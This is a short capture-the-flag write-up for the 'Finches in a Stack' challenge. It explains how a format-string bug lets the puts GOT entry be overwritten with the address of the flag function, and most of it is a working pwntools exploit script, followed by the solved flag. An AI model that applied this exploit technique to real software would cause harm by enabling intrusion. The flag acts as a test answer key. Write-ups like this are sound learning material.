# Finches in a Stack

###
`Exploit the service to get the flag.`

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

This task about canary abuse but it is possible to do it via `.got`
address rewrite.

* find out with dbg where the buffer starts
* change 'puts' on 'flag' because `.got.plt` is possible to rewrite

```python
#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
debug = 0

if debug:
    io = remote('88.198.219.20', 31360)
else:
    io = process(['./fias'])
binary = ELF('./fias')
flag = binary.symbols['flag']
# .got.plt puts address
puts = 0x0804c01c

payload  = b''
# 6 pointer to string buffer
payload += fmtstr_payload(6, {puts: flag})

io.recvuntil("Hi! What's your name? ")
io.sendline(payload)

io.interactive()
#ractf{St4ck_C4n4ry_FuN!}
```
